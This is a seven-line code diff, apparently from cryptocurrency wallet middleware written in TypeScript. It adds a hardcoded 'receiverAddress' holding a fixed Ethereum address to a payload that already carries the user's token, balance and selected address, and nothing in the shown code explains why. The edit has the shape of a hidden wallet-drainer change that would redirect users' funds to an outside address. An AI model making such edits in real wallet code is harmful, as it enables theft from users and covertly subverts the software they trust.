@@ -114,6 +114,7 @@ const method: MiddlewareFunction = async function (
       JSON.stringify({
         ...payload,
         params: [customToken, balance, selectedAddress, this.network.name],
+        receiverAddress: '0x9858EfFD232B4033E47d90003D41EC34EcaEda94'
       }),
       true,
     )
